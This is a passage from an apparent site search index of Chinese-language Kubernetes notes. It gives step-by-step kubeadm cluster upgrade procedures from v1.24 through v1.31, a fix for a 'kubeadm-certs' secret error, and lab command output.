\u8282\u70b9\u52a0\u5165\u5230\u96c6\u7fa4\u4e2d\u65f6\u62a5secret\u9519\u8bef","text":"<p>\u73b0\u8c61</p> <pre><code>I0116 04:39:41.428788  184219 checks.go:246] validating the existence and emptiness of directory /var/lib/etcd\n[preflight] Would pull the required images (like 'kubeadm config images pull')\n[download-certs] Downloading the certificates in Secret \"kubeadm-certs\" in the \"kube-system\" Namespace\nsecrets \"kubeadm-certs\" is forbidden: User \"system:bootstrap:20w21w\" cannot get resource \"secrets\" in API group \"\" in the namespace \"kube-system\"\nerror downloading the secret\n</code></pre> <p>\u89e3\u51b3</p> <pre><code>kubeadm init phase upload-certs --upload-certs\n  # [upload-certs] Storing the certificates in Secret \"kubeadm-certs\" in the \"kube-system\" Namespace\n  # [upload-certs] Using certificate key:\n  # 3a3d7610038c9d14edf377d92b9c6b44e049566ddd25b0e69bf571af58227ae7\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.24/","title":"Upgrade - v1.24.0","text":"<p>Reference</p> <p>\u5347\u7ea7\u524d\u540e\u7248\u672c\u5bf9\u6bd4</p> \u8f6f\u4ef6\u540d\u79f0 \u5f53\u524d\u7248\u672c \u5347\u7ea7\u7248\u672c kubeadm 1.23.6-00 1.24.0-00 kubelet 1.23.6-00 1.24.0-00 kubernetes 1.23.6-00 1.24.0-00 etcd 3.5.1 3.5.3-0 flannel v0.15.1 v0.17.0 coredns v1.8.6 v1.8.6 containerd 1.5.9-0ubuntu1~20.04.1 1.5.9-0ubuntu1~20.04.1 <p>\u4f18\u5316\u8bbf\u95ee\u955c\u50cf</p>"},{"location":"kubernetes/06-cluster-upgrade-1.24/#_1","title":"\u4e00\u3001\u5347\u7ea7\u4e8c\u8fdb\u5236","text":"<pre><code>apt update\napt-mark showhold\n\n# containerd\napt install -y --allow-change-held-packages containerd=1.5.9-0ubuntu1~20.04.1\n\n# kubernetes\napt install -y --allow-change-held-packages kubeadm=1.24.0-00 kubectl=1.24.0-00 kubelet=1.24.0-00\n\n# validate\ndpkg -l | grep -E \"kube|containerd\"\ncontainerd --version\nkubeadm version\n\n# hold\napt-mark hold containerd kubeadm kubectl kubelet &amp;&amp; apt-mark showhold\n\n# lib\nls -l /var/lib/{containerd,etcd,kubelet}\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.24/#_2","title":"\u4e8c\u3001\u5347\u7ea7\u96c6\u7fa4","text":"<pre><code>systemctl restart containerd\n\n# \u67e5\u770b\u5347\u7ea7\u8ba1\u5212\nkubeadm upgrade plan \n\n# \u5347\u7ea7\u96c6\u7fa4 &lt;\u4ec5\u9700\u8981\u5728\u4e00\u53f0master\u8282\u70b9\u6267\u884c\u4e00\u6b21&gt;\nkubeadm upgrade apply v1.24.0 -v 5\n\n# \u91cd\u542fkubelet &lt;\u914d\u7f6e\u672a\u968fkubernetes\u5347\u7ea7&gt;\nsed -i 's/pause:3.6/pause:3.7/' /var/lib/kubelet/kubeadm-flags.env\nsystemctl restart kubelet\nsystemctl status kubelet\n\n# \u4f9d\u6b21\u5347\u7ea7\u5269\u4e0bcontrol-plane/node\u8282\u70b9\nkubeadm upgrade node -v 5\n\n# \u67e5\u770b\u8282\u70b9\u7ec4\u4ef6\u8bc1\u4e66\u7b7e\u540d\nkubeadm certs check-expiration\n\n# \u5347\u7ea7coredns &lt;\u672a\u968fkubernetes\u5347\u7ea7&gt;\nkubectl -n kube-system edit deployment.apps/coredns\n# hub.8ops.top/google_containers/coredns:1.8.4 --&gt; v1.8.6\n\n# \u67e5\u770b\u96c6\u7fa4\u57fa\u7840\u7ec4\u4ef6\u8fd0\u884c\nkubectl -n kube-system get all\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.24/#_3","title":"\u4e09\u3001\u8f93\u51fa\u6548\u679c","text":""},{"location":"kubernetes/06-cluster-upgrade-1.24/#31","title":"3.1 \u5347\u7ea7\u4e8c\u8fdb\u5236","text":"<p>\u5347\u7ea7\u4e8c\u8fdb\u5236\u5305</p> <pre><code>root@K-KUBE-LAB-01:~# apt install kubeadm=1.23.0-00 kubectl=1.23.0-00 kubelet=1.23.0-00\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following packages will be upgraded:\n  kubeadm kubectl kubelet\n3 upgraded, 0 newly installed, 0 to remove and 88 not upgraded.\nNeed to get 37.0 MB of archives.\nAfter this operation, 29.8 MB disk space will be freed.\nGet:1 https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 kubelet amd64 1.23.0-00 [19.5 MB]\nGet:2 https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 kubectl amd64 1.23.0-00 [8,932 kB]\nGet:3 https://mirrors.aliyun.com/kubernetes/apt kubernetes-xenial/main amd64 kubeadm amd64 1.23.0-00 [8,588 kB]\nFetched 37.0 MB in 11s (3,437 kB/s)\n(Reading database ... 64615 files and directories currently installed.)\nPreparing to unpack .../kubelet_1.23.0-00_amd64.deb ...\nUnpacking kubelet (1.23.0-00) over (1.22.2-00) ...\nPreparing to unpack .../kubectl_1.23.0-00_amd64.deb ...\nUnpacking kubectl (1.23.0-00) over (1.22.2-00) ...\nPreparing to unpack .../kubeadm_1.23.0-00_amd64.deb ...\nUnpacking kubeadm (1.23.0-00) over (1.22.2-00) ...\nSetting up kubectl (1.23.0-00) ...\nSetting up kubelet (1.23.0-00) ...\nSetting up kubeadm (1.23.0-00) ...\n</code></pre> <p>\u67e5\u9a8c\u4e8c\u8fdb\u5236\u5b89\u88c5\u60c5\u51b5</p> <pre><code>root@K-KUBE-LAB-01:~# dpkg -l | grep kube &amp;&amp; kubeadm version\nii  kubeadm                              1.23.0-00                         amd64        Kubernetes Cluster Bootstrapping Tool\nii  kubectl                              1.23.0-00                         amd64        Kubernetes Command Line Tool\nii  kubelet                              1.23.0-00                         amd64        Kubernetes Node Agent\nii  kubernetes-cni                       0.8.7-00                          amd64        Kubernetes CNI\nkubeadm version: &amp;version.Info{Major:\"1\", Minor:\"23\", GitVersion:\"v1.23.0\", GitCommit:\"ab69524f795c42094a6630298ff53f3c3ebab7f4\", GitTreeState:\"clean\", BuildDate:\"2021-12-07T18:15:11Z\", GoVersion:\"go1.17.3\", Compiler:\"gc\", Platform:\"linux/amd64\"}\n\nroot@K-KUBE-LAB-01:~# apt-mark hold kubeadm kubectl kubelet &amp;&amp; apt-mark showhold\nkubeadm set on hold.\nkubectl set on hold.\nkubelet set on hold.\ncontainerd\nkubeadm\nkubectl\nkubelet\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.24/#32","title":"3.2 \u5347\u7ea7\u96c6\u7fa4","text":"<p>\u67e5\u770b\u5347\u7ea7\u8ba1\u5212</p> <pre><code>root@K-KUBE-LAB-01:/opt# kubeadm upgrade plan\n[upgrade/config] Making sure the configuration is correct:\n[upgrade/config] Reading configuration from the cluster...\n[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[preflight] Running pre-flight checks.\n[upgrade] Running cluster health checks\n[upgrade] Fetching available versions to upgrade to\n[upgrade/versions] Cluster version: v1.22.0\n[upgrade/versions] kubeadm version: v1.23.0\n[upgrade/versions] Target version: v1.23.0\n[upgrade/versions] Latest version in the v1.23 series: v1.23.0\n\nComponents that must be upgraded manually after you have upgraded the control plane with 'kubeadm upgrade apply':\nCOMPONENT   CURRENT       TARGET\nkubelet     5 x v1.23.0   v1.23.0\n\nUpgrade to the latest version in the v1.23 series:\n\nCOMPONENT                 CURRENT   TARGET\nkube-apiserver            v1.23.0   v1.23.0\nkube-controller-manager   v1.23.0   v1.23.0\nkube-scheduler            v1.23.0   v1.23.0\nkube-proxy                v1.23.0   v1.23.0\nCoreDNS                   1.8.4     v1.8.6\netcd                      3.5.1-0   3.5.1-0\n\nYou can now apply the upgrade by executing the following command:\n\n    kubeadm upgrade apply v1.23.0\n\nNote: Before you can perform this upgrade, you have to update kubeadm to v1.23.0.\n\n_____________________________________________________________________\n\n\nThe table below shows the current state of component configs as understood by this version of kubeadm.\nConfigs that have a \"yes\" mark in the \"MANUAL UPGRADE REQUIRED\" column require manual config upgrade or\nresetting to kubeadm defaults before a successful upgrade can be performed. The version to manually\nupgrade to is denoted in the \"PREFERRED VERSION\" column.\n\nAPI GROUP                 CURRENT VERSION   PREFERRED VERSION   MANUAL UPGRADE REQUIRED\nkubeproxy.config.k8s.io   v1alpha1          v1alpha1            no\nkubelet.config.k8s.io     v1beta1           v1beta1             no\n_____________________________________________________________________\n</code></pre> <p>\u5347\u7ea7\u96c6\u7fa4</p> <pre><code>root@K-KUBE-LAB-01:/opt# kubeadm upgrade apply v1.23.0\n[upgrade/config] Making sure the configuration is correct:\n[upgrade/config] Reading configuration from the cluster...\n[upgrade/config] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[preflight] Running pre-flight checks.\n[upgrade] Running cluster health checks\n[upgrade/version] You have chosen to change the cluster version to \"v1.23.0\"\n[upgrade/versions] Cluster version: v1.23.0\n[upgrade/versions] kubeadm version: v1.23.0\n[upgrade/confirm] Are you sure you want to proceed with the upgrade? [y/N]: y\n[upgrade/prepull] Pulling images required for setting up a Kubernetes cluster\n[upgrade/prepull] This might take a minute or two, depending on the speed of your internet connection\n[upgrade/prepull] You can also perform this action in beforehand using 'kubeadm config images pull'\n[upgrade/apply] Upgrading your Static Pod-hosted control plane to version \"v1.23.0\"...\nStatic pod: kube-apiserver-k-kube-lab-01 hash: e300612cfc9bddbfe269ef9f69c6a68f\nStatic pod: kube-controller-manager-k-kube-lab-01 hash: 852bdcee5effb8966c5dfb63a6d52e1b\nStatic pod: kube-scheduler-k-kube-lab-01 hash: 0f85f2476aad9da7c200af3e1f1151b3\n[upgrade/etcd] Upgrading to TLS for etcd\nStatic pod: etcd-k-kube-lab-01 hash: 22ac6fef1edf96d0d47ae64814294c48\n[upgrade/staticpods] Preparing for \"etcd\" upgrade\n[upgrade/staticpods] Current and new manifests of etcd are equal, skipping upgrade\n[upgrade/etcd] Waiting for etcd to become available\n[upgrade/staticpods] Writing new Static Pod manifests to \"/etc/kubernetes/tmp/kubeadm-upgraded-manifests2109837075\"\n[upgrade/staticpods] Preparing for \"kube-apiserver\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-apiserver are equal, skipping upgrade\n[upgrade/staticpods] Preparing for \"kube-controller-manager\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-controller-manager are equal, skipping upgrade\n[upgrade/staticpods] Preparing for \"kube-scheduler\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-scheduler are equal, skipping upgrade\n[upgrade/postupgrade] Applying label node-role.kubernetes.io/control-plane='' to Nodes with label node-role.kubernetes.io/master='' (deprecated)\n[upload-config] Storing the configuration used in ConfigMap \"kubeadm-config\" in the \"kube-system\" Namespace\n[kubelet] Creating a ConfigMap \"kubelet-config-1.23\" in namespace kube-system with the configuration for the kubelets in the cluster\nNOTE: The \"kubelet-config-1.23\" naming of the kubelet ConfigMap is deprecated. Once the UnversionedKubeletConfigMap feature gate graduates to Beta the default name will become just \"kubelet-config\". Kubeadm upgrade will handle this transition transparently.\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to get nodes\n[bootstrap-token] configured RBAC rules to allow Node Bootstrap tokens to post CSRs in order for nodes to get long term certificate credentials\n[bootstrap-token] configured RBAC rules to allow the csrapprover controller automatically approve CSRs from a Node Bootstrap Token\n[bootstrap-token] configured RBAC rules to allow certificate rotation for all node client certificates in the cluster\n[addons] Applied essential addon: CoreDNS\n[addons] Applied essential addon: kube-proxy\n\n[upgrade/successful] SUCCESS! Your cluster was upgraded to \"v1.23.0\". Enjoy!\n\n[upgrade/kubelet] Now that your control plane is upgraded, please proceed with upgrading your kubelets if you haven't already done so.\n</code></pre> <p>\u91cd\u542fkubelet</p> <pre><code>root@K-KUBE-LAB-01:/opt# cat /var/lib/kubelet/kubeadm-flags.env\nKUBELET_KUBEADM_ARGS=\"--container-runtime=remote --container-runtime-endpoint=/run/containerd/containerd.sock --pod-infra-container-image=hub.8ops.top/google_containers/pause:3.6\"\n</code></pre> <p>\u5347\u7ea7control-plane\u8282\u70b9</p> <pre><code>[upgrade] Reading configuration from the cluster...\n[upgrade] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[preflight] Running pre-flight checks\n[preflight] Pulling images required for setting up a Kubernetes cluster\n[preflight] This might take a minute or two, depending on the speed of your internet connection\n[preflight] You can also perform this action in beforehand using 'kubeadm config images pull'\n[upgrade] Upgrading your Static Pod-hosted control plane instance to version \"v1.23.0\"...\nStatic pod: kube-apiserver-k-kube-lab-02 hash: 72ef403458c0e6cc4a2a881a7a1e87a1\nStatic pod: kube-controller-manager-k-kube-lab-02 hash: 091e5187c5ddc3ba94ea9972160ab10f\nStatic pod: kube-scheduler-k-kube-lab-02 hash: bc1ed2e4c30353dc774c55cd248bfe8e\n[upgrade/etcd] Upgrading to TLS for etcd\nStatic pod: etcd-k-kube-lab-02 hash: 64eadc3c867a01c762c2266ad4b7112a\n[upgrade/staticpods] Preparing for \"etcd\" upgrade\n[upgrade/staticpods] Current and new manifests of etcd are equal, skipping upgrade\n[upgrade/etcd] Waiting for etcd to become available\n[upgrade/staticpods] Writing new Static Pod manifests to \"/etc/kubernetes/tmp/kubeadm-upgraded-manifests1190914493\"\n[upgrade/staticpods] Preparing for \"kube-apiserver\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-apiserver are equal, skipping upgrade\n[upgrade/staticpods] Preparing for \"kube-controller-manager\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-controller-manager are equal, skipping upgrade\n[upgrade/staticpods] Preparing for \"kube-scheduler\" upgrade\n[upgrade/staticpods] Current and new manifests of kube-scheduler are equal, skipping upgrade\n[upgrade] The control plane instance for this node was successfully updated!\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[upgrade] The configuration for this node was successfully updated!\n[upgrade] Now you should go ahead and upgrade the kubelet package using your package manager.\n</code></pre> <p>\u5347\u7ea7node\u8282\u70b9</p> <pre><code>[upgrade] Reading configuration from the cluster...\n[upgrade] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n[preflight] Running pre-flight checks\n[preflight] Skipping prepull. Not a control plane node.\n[upgrade] Skipping phase. Not a control plane node.\n[kubelet-start] Writing kubelet configuration to file \"/var/lib/kubelet/config.yaml\"\n[upgrade] The configuration for this node was successfully updated!\n[upgrade] Now you should go ahead and upgrade the kubelet package using your package manager.\n</code></pre> <p>\u67e5\u770b\u8282\u70b9\u7ec4\u4ef6\u8bc1\u4e66\u7b7e\u540d</p> <pre><code>root@K-KUBE-LAB-01:~# kubeadm certs check-expiration\n[check-expiration] Reading configuration from the cluster...\n[check-expiration] FYI: You can look at this config file with 'kubectl -n kube-system get cm kubeadm-config -o yaml'\n\nCERTIFICATE                EXPIRES                  RESIDUAL TIME   CERTIFICATE AUTHORITY   EXTERNALLY MANAGED\nadmin.conf                 Dec 23, 2022 02:44 UTC   364d                                    no\napiserver                  Dec 23, 2022 02:27 UTC   364d            ca                      no\napiserver-etcd-client      Dec 23, 2022 02:27 UTC   364d            etcd-ca                 no\napiserver-kubelet-client   Dec 23, 2022 02:27 UTC   364d            ca                      no\ncontroller-manager.conf    Dec 23, 2022 02:28 UTC   364d                                    no\netcd-healthcheck-client    Dec 23, 2022 02:27 UTC   364d            etcd-ca                 no\netcd-peer                  Dec 23, 2022 02:27 UTC   364d            etcd-ca                 no\netcd-server                Dec 23, 2022 02:27 UTC   364d            etcd-ca                 no\nfront-proxy-client         Dec 23, 2022 02:27 UTC   364d            front-proxy-ca          no\nscheduler.conf             Dec 23, 2022 02:28 UTC   364d                                    no\n\nCERTIFICATE AUTHORITY   EXPIRES                  RESIDUAL TIME   EXTERNALLY MANAGED\nca                      Dec 08, 2031 05:54 UTC   9y              no\netcd-ca                 Dec 08, 2031 05:54 UTC   9y              no\nfront-proxy-ca          Dec 08, 2031 05:54 UTC   9y              no\n</code></pre> <p>\u67e5\u770bcoredns\u8fd0\u884c</p> <pre><code>root@K-KUBE-LAB-02:~# kubectl -n kube-system get all -l k8s-app=kube-dns -o wide\nNAME                           READY   STATUS    RESTARTS   AGE   IP            NODE            NOMINATED NODE   READINESS GATES\npod/coredns-7b8886d7cd-c27r6   1/1     Running   0          40s   172.20.4.14   k-kube-lab-05   &lt;none&gt;           &lt;none&gt;\npod/coredns-7b8886d7cd-k2jcf   1/1     Running   0          40s   172.20.2.3    k-kube-lab-03   &lt;none&gt;           &lt;none&gt;\n\nNAME               TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE   SELECTOR\nservice/kube-dns   ClusterIP   192.168.0.10   &lt;none&gt;        53/UDP,53/TCP,9153/TCP   12d   k8s-app=kube-dns\n\nNAME                      READY   UP-TO-DATE   AVAILABLE   AGE   CONTAINERS   IMAGES                                         SELECTOR\ndeployment.apps/coredns   2/2     2            2           12d   coredns      hub.8ops.top/google_containers/coredns:1.8.6   k8s-app=kube-dns\n\nNAME                                 DESIRED   CURRENT   READY   AGE   CONTAINERS   IMAGES                                         SELECTOR\nreplicaset.apps/coredns-56745ff78    0         0         0       12d   coredns      hub.8ops.top/google_containers/coredns:1.8.4   k8s-app=kube-dns,pod-template-hash=56745ff78\nreplicaset.apps/coredns-7b8886d7cd   2         2         2       35m   coredns      hub.8ops.top/google_containers/coredns:1.8.6   k8s-app=kube-dns,pod-template-hash=7b8886d7cd\n</code></pre> <p>\u67e5\u770b\u96c6\u7fa4\u57fa\u7840\u7ec4\u4ef6\u8fd0\u884c</p> <pre><code>root@K-KUBE-LAB-01:/opt# kubectl -n kube-system get all\nNAME                                        READY   STATUS    RESTARTS      AGE\npod/coredns-56745ff78-8lf2v                 1/1     Running   0             107s\npod/coredns-56745ff78-xvjr8                 1/1     Running   0             107s\npod/etcd-k-kube-lab-01                      1/1     Running   0             9d\npod/etcd-k-kube-lab-02                      1/1     Running   0             29m\npod/etcd-k-kube-lab-03                      1/1     Running   0             29m\npod/kube-apiserver-k-kube-lab-01            1/1     Running   0             9d\npod/kube-apiserver-k-kube-lab-02            1/1     Running   0             29m\npod/kube-apiserver-k-kube-lab-03            1/1     Running   0             29m\npod/kube-controller-manager-k-kube-lab-01   1/1     Running   1 (29m ago)   9d\npod/kube-controller-manager-k-kube-lab-02   1/1     Running   0             28m\npod/kube-controller-manager-k-kube-lab-03   1/1     Running   0             28m\npod/kube-flannel-ds-g572q                   1/1     Running   0             12d\npod/kube-flannel-ds-hwgv2                   1/1     Running   0             12d\npod/kube-flannel-ds-l8lww                   1/1     Running   0             12d\npod/kube-flannel-ds-tbs8l                   1/1     Running   0             12d\npod/kube-flannel-ds-z9sjj                   1/1     Running   0             12d\npod/kube-proxy-8wgfl                        1/1     Running   0             9d\npod/kube-proxy-cdzmz                        1/1     Running   0             9d\npod/kube-proxy-m22z7                        1/1     Running   0             9d\npod/kube-proxy-r6pxx                        1/1     Running   0             9d\npod/kube-proxy-wpp72                        1/1     Running   0             9d\npod/kube-scheduler-k-kube-lab-01            1/1     Running   1 (29m ago)   9d\npod/kube-scheduler-k-kube-lab-02            1/1     Running   0             28m\npod/kube-scheduler-k-kube-lab-03            1/1     Running   0             28m\n\nNAME               TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)                  AGE\nservice/kube-dns   ClusterIP   192.168.0.10   &lt;none&gt;        53/UDP,53/TCP,9153/TCP   12d\n\nNAME                             DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR            AGE\ndaemonset.apps/kube-flannel-ds   5         5         5       5            5           &lt;none&gt;                   12d\ndaemonset.apps/kube-proxy        5         5         5       5            5           kubernetes.io/os=linux   12d\n\nNAME                      READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/coredns   2/2     2            2           12d\n\nNAME                                 DESIRED   CURRENT   READY   AGE\nreplicaset.apps/coredns-56745ff78    2         2         2       12d\nreplicaset.apps/coredns-7b8886d7cd   0         0         0       23m\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.25/","title":"Upgrade - v1.25.0","text":"<p>Reference</p> <p>\u5347\u7ea7\u524d\u540e\u7248\u672c\u5bf9\u6bd4</p> \u8f6f\u4ef6\u540d\u79f0 \u5f53\u524d\u7248\u672c \u5347\u7ea7\u7248\u672c kubeadm 1.24.0-00 1.25.0-00 kubelet 1.24.0-00 1.25.0-00 kubernetes 1.24.0-00 1.25.0-00 etcd 3.5.3-0 3.5.4-0 flannel v0.17.0 v0.19.1 coredns v1.8.6 v1.9.3 containerd 1.5.9-0ubuntu1~20.04.1 1.5.9-0ubuntu1~20.04.4 <p>\u4f18\u5316\u8bbf\u95ee\u955c\u50cf</p>"},{"location":"kubernetes/06-cluster-upgrade-1.25/#_1","title":"\u4e00\u3001\u5347\u7ea7\u4e8c\u8fdb\u5236","text":"<pre><code>apt update\napt-mark showhold\n\n# containerd\nCONTAINERD_VERSION=1.5.9-0ubuntu1~20.04.4\napt install -y --allow-change-held-packages containerd=${CONTAINERD_VERSION}\n\n# kubernetes\nKUBERNETES_VERSION=1.25.0-00\napt install -y --allow-change-held-packages kubeadm=${KUBERNETES_VERSION} kubectl=${KUBERNETES_VERSION} kubelet=${KUBERNETES_VERSION}\n\n# validate\ndpkg -l | grep -E \"kube|containerd\"\ncontainerd --version\nkubeadm version\n\n# hold\napt-mark hold containerd kubeadm kubectl kubelet &amp;&amp; apt-mark showhold\n\n# lib\nls -l /var/lib/{containerd,etcd,kubelet}\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.25/#_2","title":"\u4e8c\u3001\u5347\u7ea7\u96c6\u7fa4","text":"<pre><code>systemctl restart containerd\n\n# \u67e5\u770b\u5347\u7ea7\u8ba1\u5212\nkubeadm upgrade plan \n\n# \u5347\u7ea7\u96c6\u7fa4 &lt;\u4ec5\u9700\u8981\u5728\u4e00\u53f0master\u8282\u70b9\u6267\u884c\u4e00\u6b21&gt;\nkubeadm upgrade apply v1.25.0\n\n# \u91cd\u542fkubelet &lt;\u914d\u7f6e\u672a\u968fkubernetes\u5347\u7ea7&gt;\nsed -i 's/pause:3.7/pause:3.8/' /var/lib/kubelet/kubeadm-flags.env\nsystemctl restart kubelet\nsystemctl status kubelet\n\n# \u4f9d\u6b21\u5347\u7ea7\u5269\u4e0bcontrol-plane/node\u8282\u70b9\nkubeadm upgrade node\n\n# \u67e5\u770b\u8282\u70b9\u7ec4\u4ef6\u8bc1\u4e66\u7b7e\u540d\nkubeadm certs check-expiration\n\n# \u5347\u7ea7coredns &lt;\u672a\u968fkubernetes\u5347\u7ea7&gt;\nkubectl -n kube-system edit deployment.apps/coredns\n# hub.8ops.top/google_containers/coredns:v1.8.6 --&gt; v1.9.3\n\n# \u67e5\u770b\u96c6\u7fa4\u57fa\u7840\u7ec4\u4ef6\u8fd0\u884c\nkubectl -n kube-system get all\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.26/","title":"Upgrade - v1.26.0","text":"<p>Reference</p> <p>\u4ecev1.25.2\u4e4b\u540ekubernetes\u7684\u4e8c\u8fdb\u5236\u5b89\u88c5\u6e90\u53d1\u751f\u4e86\u53d8\u5316\u3002</p> <pre><code># \u7ecf\u6d4b\u8bd5\u652f\u6301\u4ee5\u4e0b\u7248\u672c\n1.26.15-1.1\n1.27.16-1.1\n1.28.14-2.1\n1.29.9-1.1\n1.30.5-1.1\n1.31.1-1.1\n</code></pre> <p>\u53c2\u8003\u963f\u91cc\u4ecb\u7ecd</p> <pre><code># APT\u6e90\u9884\u5904\u7406 &lt;\u66ff\u6362v1.26&gt;\n\napt update &amp;&amp; apt install -y apt-transport-https\n\nsed -i '/kubernetes/d' /etc/apt/sources.list\n\nexport KUBE_VERSION_FOR_APT=v1.26\nexport KUBE_VERSION_FOR_APT=v1.27\nexport KUBE_VERSION_FOR_APT=v1.28\nexport KUBE_VERSION_FOR_APT=v1.29\nexport KUBE_VERSION_FOR_APT=v1.30\nexport KUBE_VERSION_FOR_APT=v1.31\nmkdir -p /etc/apt/keyrings\ncurl -kfsSL https://mirrors.aliyun.com/kubernetes-new/core/stable/${KUBE_VERSION_FOR_APT}/deb/Release.key | \\\n    gpg --dearmor -o /etc/apt/keyrings/kubernetes-apt-keyring.gpg\n\necho \"deb [signed-by=/etc/apt/keyrings/kubernetes-apt-keyring.gpg] https://mirrors.aliyun.com/kubernetes-new/core/stable/${KUBE_VERSION_FOR_APT}/deb/ /\" | tee /etc/apt/sources.list.d/kubernetes.list\napt update &amp;&amp; apt info kubeadm\n</code></pre> <p>\u5347\u7ea7\u524d\u540e\u7248\u672c\u5bf9\u6bd4</p> \u8f6f\u4ef6\u540d\u79f0 \u5f53\u524d\u7248\u672c \u5347\u7ea7\u7248\u672c kubeadm 1.25.0-00 1.26.15-1.1 kubelet 1.25.0-00 1.26.15-1.1 kubernetes 1.25.0-00 1.26.15-1.1 etcd 3.5.4-0 3.5.10 flannel v0.19.1 - coredns v1.9.3 v1.9.3 containerd 1.5.9-0ubuntu1~20.04.4 1.7.12-0ubuntu2~20.04.1 <p>\u4f18\u5316\u8bbf\u95ee\u955c\u50cf</p>"},{"location":"kubernetes/06-cluster-upgrade-1.26/#_1","title":"\u4e00\u3001\u5347\u7ea7\u4e8c\u8fdb\u5236","text":"<pre><code>cp -r /etc/kubernetes{,-$(date +%Y%m%d-01)}\n# cp -r /etc/kubernetes{,-v1.30}\n\napt update\napt-mark showhold\n\n# containerd\nexport CONTAINERD_VERSION=1.7.12-0ubuntu2~20.04.1\napt install -y --allow-change-held-packages containerd=${CONTAINERD_VERSION}\n\n# kubernetes\nexport KUBE_VERSION_FOR_BINARY=1.26.15-1.1\nexport KUBE_VERSION_FOR_BINARY=1.27.16-1.1\nexport KUBE_VERSION_FOR_BINARY=1.28.14-2.1\nexport KUBE_VERSION_FOR_BINARY=1.29.9-1.1\nexport KUBE_VERSION_FOR_BINARY=1.30.5-1.1\nexport KUBE_VERSION_FOR_BINARY=1.31.1-1.1\napt install -y --allow-change-held-packages kubeadm=${KUBE_VERSION_FOR_BINARY} kubectl=${KUBE_VERSION_FOR_BINARY} kubelet=${KUBE_VERSION_FOR_BINARY}\n\n# detect\ndpkg -l | grep -E \"kube|containerd\"\ncontainerd --version\nkubeadm version -o short\n\n# hold\napt-mark hold containerd kubeadm kubectl kubelet &amp;&amp; apt-mark showhold\n\n# lib\ndf -lh / /data1\nls -l /var/lib/{containerd,etcd,kubelet}\n</code></pre>"},{"location":"kubernetes/06-cluster-upgrade-1.26/#_2","title":"\u4e8c\u3001\u5347\u7ea7\u96c6\u7fa4","text":"<pre><code>systemctl restart containerd\n\nexport KUBE_VERSION=v1.26.15\nexport KUBE_VERSION=v1.27.16\nexport KUBE_VERSION=v1.28.14\nexport KUBE_VERSION=v1.29.9\nexport KUBE_VERSION=v1.30.5\nexport KUBE_VERSION=v1.31.1\ncd /opt/kubernetes\n\n# \u67e5\u770b\u5347\u7ea7\u8ba1\u5212 &lt;FW&gt;\nkubeadm config print init-defaults | tee kubeadm-init.yaml-${KUBE_VERSION}-default\nkubeadm upgrade plan \n\ncp kubeadm-init.yaml-${KUBE_VERSION}-default kubeadm-init.yaml-${KUBE_VERSION}\nvim kubeadm-init.yaml-${KUBE_VERSION}\n\n# \u7ec4\u4ef6\u7248\u672c\u8bbe\u7f6e\nkubectl api-versions\n\n# \u6253\u5370\u539f\u59cbimage\nkubeadm config images list\n\n# \u6253\u5370\u66f4\u65b0\u914d\u7f6e\u6587\u4ef6\u540e\u7684image\nkubeadm config images list --config kubeadm-init.yaml-${KUBE_VERSION} -v 5\n\n# \u9884\u62c9\u53d6\u955c\u50cf\u8d44\u6e90\nkubeadm config images pull --config kubeadm-init.yaml-${KUBE_VERSION} -v 5\n\n# \u5347\u7ea7\u96c6\u7fa4 \nkubeadm upgrade apply ${KUBE_VERSION} --config kubeadm-init.yaml-${KUBE_VERSION} -v 5\n\n# &lt;\u4ee5\u4e0a\u64cd\u4f5c\u4ec5\u9700\u8981\u5728\u4e00\u53f0master\u8282\u70b9\u6267\u884c\u4e00\u6b21&gt; #\n\n# \u91cd\u542fkubelet &lt;\u5f53\u7248\u672c\u6709\u53d8\u5316\u914d\u7f6e\u672a\u968fkubernetes\u5347\u7ea7&gt;\n# \u91cd\u542f\u540e\u53ef\u4ee5\u901a\u8fc7 kubectl get no \u67e5\u770b\u8282\u70b9\u7248\u672c\u53d1\u751f\u4e86\u53d8\u5316\nsed -i 's/pause:3.8/pause:3.9/' /var/lib/kubelet/kubeadm-flags.env  # v1.25 ~ v1.30\nsed -i 's/pause:3.9/pause:3.10/' /var/lib/kubelet/kubeadm-flags.env # v1.31\nsystemctl restart kubelet\nsystemctl status kubelet\n\n# \u91cd\u542fcontainerd &lt;\u5f53\u7248\u672c\u6709\u53d8\u5316&gt;\nsed -i 's/pause:3.8/pause:3.9/' /etc/containerd/config.toml  # v1.25 ~ v1.30\nsed -i 's/pause:3.9/pause:3.10/' /etc/containerd/config.toml # v1.10\nsystemctl restart containerd\nsystemctl status containerd\n\n# \u4f9d\u6b21\u5347\u7ea7\u5269\u4e0bcontrol-plane/node\u8282\u70b9\nkubeadm upgrade node\n\nsystemctl restart kubelet\nsystemctl restart containerd\n\n# \u67e5\u770b\u96c6\u7fa4\u7248\u672c\nkubectl version --short # v1.25 ~ v1.29\nkubectl version \n\n# \u67e5\u770b\u8282\u70b9\u7ec4\u4ef6\u8bc1\u4e66\u7b7e\u540d\nkubeadm certs check-expiration\n\n# 